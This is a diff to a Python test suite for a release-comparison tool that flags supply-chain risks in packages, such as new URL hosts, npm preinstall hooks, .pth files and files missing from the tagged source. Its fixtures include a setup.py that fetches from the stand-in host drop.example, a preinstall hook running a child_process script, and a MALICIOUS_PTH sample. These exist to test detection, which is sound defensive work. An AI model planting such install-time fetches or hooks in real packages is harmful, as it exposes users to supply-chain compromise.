@@ -35,7 +35,7 @@ class Diff(TempCase):
         new = write_tar(self.path("demo-1.1.tar.gz"),
                         {"demo-1.1/PKG-INFO": b"2",
                          "demo-1.1/setup.py": b"fetch('https://drop.example/x')\nsetup()\n"})
-        records = diff(read_artifact(old), read_artifact(new), with_files=False)
+        records = [r for r in diff(read_artifact(old), read_artifact(new)) if r[0] != "file"]
         self.assertEqual(records, [
             ("build", "changed", "setup.py", "setup.py"),
             ("url-host", "added", "setup.py", "drop.example"),
@@ -44,8 +44,8 @@ class Diff(TempCase):
     def test_known_host_is_not_new(self):
         old = write_zip(self.path("a.whl"), {"a.py": b"'https://docs.example/'"})
         new = write_zip(self.path("b.whl"), {"b.py": b"'https://docs.example/other'"})
-        records = diff(read_artifact(old), read_artifact(new), with_files=False)
-        self.assertEqual(records, [])
+        records = diff(read_artifact(old), read_artifact(new))
+        self.assertEqual(records, [("file", "added", "b.py", "-"), ("file", "removed", "a.py", "-")])
 
     def test_npm_preinstall_added(self):
         old = write_tar(self.path("demo-1.0.0.tgz"),
@@ -54,9 +54,20 @@ class Diff(TempCase):
                         {"package/package.json":
                          b'{"version": "1.0.1", "scripts": {"test": "t", "preinstall": "node setup.js"}}',
                          "package/setup.js": b"require('child_process')\n"})
-        code, out, err = run_cli("diff", "--surfaces", old, new)
+        code, out, err = run_cli("diff", old, new)
         self.assertEqual((code, err), (1, b""))
-        self.assertEqual(out, b"npm-script\tadded\tpackage.json\tpreinstall=node setup.js\n")
+        self.assertEqual(out.decode().splitlines(), [
+            "file\tadded\tsetup.js\t-",
+            "file\tchanged\tpackage.json\t-",
+            "npm-script\tadded\tpackage.json\tpreinstall=node setup.js",
+        ])
+
+    def test_file_changes_without_findings_exit_0(self):
+        old, new = self.wheels({"demo/extra.py": b"def sub(a, b):\n    return a - b\n"})
+        code, out, err = run_cli("diff", old, new)
+        self.assertEqual((code, err), (0, b""))
+        self.assertIn(b"file\tadded\tdemo/extra.py\t-\n", out)
+        self.assertTrue(all(line.startswith(b"file\t") for line in out.splitlines()))
 
     def test_identical_releases_exit_0_with_no_output(self):
         old, _ = self.wheels({})
@@ -76,9 +87,11 @@ class Diff(TempCase):
 
     def test_json_output(self):
         old, new = self.wheels({"demo_init.pth": MALICIOUS_PTH})
-        code, out, _ = run_cli("diff", "--json", "--surfaces", old, new)
+        code, out, _ = run_cli("diff", "--json", old, new)
         self.assertEqual(code, 1)
-        self.assertEqual(json.loads(out.decode()), [
+        rows = json.loads(out.decode())
+        self.assertIn({"category": "file", "status": "added", "path": "demo_init.pth", "detail": "-"}, rows)
+        self.assertEqual([r for r in rows if r["category"] != "file"], [
             {"category": "pth", "status": "added", "path": "demo_init.pth", "detail": "import"}])
 
     def test_unreadable_artifact_exits_2(self):
@@ -169,9 +182,9 @@ class Source(TempCase):
             "demo-1.0.dist-info/licenses/LICENSE": b"different\n",
             "demo-1.0.dist-info/RECORD.jws": b"sig",
         })
-        # Exit status follows what is printed: no findings beyond files, so 0.
-        self.assertEqual(self.run_source(whl2, "--surfaces"), (0, b"", b""))
+        # A file that is not in the tag is a finding on its own.
         code, out, _ = self.run_source(whl2)
+        self.assertEqual(code, 1)
         self.assertEqual(out.decode().splitlines(), [
             "file\tnot-in-tag\tdemo-1.0.dist-info/RECORD.jws\t-",
             "file\tnot-in-tag\tdemo-1.0.dist-info/licenses/LICENSE\t-",
